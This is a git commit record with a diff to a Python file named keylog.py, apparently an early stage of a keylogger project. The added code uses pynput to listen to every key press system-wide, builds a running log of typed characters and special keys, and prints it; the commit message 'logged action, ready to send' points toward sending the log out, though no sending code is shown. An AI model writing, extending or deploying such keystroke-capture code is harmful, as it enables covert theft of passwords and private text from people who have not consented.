66dd83e37f165c4cd18f7429804b433feaab443a
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-03 12:07:59 -0400

    logged action, ready to send

--- keylog.py
+++ keylog.py
@@ -1,9 +1,19 @@
 #!/usr/bin/env python
 import pynput.keyboard
 
+log = ""
 def use_keys(key):
     print(key)
 
+    global log
+    try:
+        log += str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        else:
+            log += " [" + str(key) + "] "
+    print(log)
 
 key_rec = pynput.keyboard.Listener(on_press=use_keys)
 with key_rec:
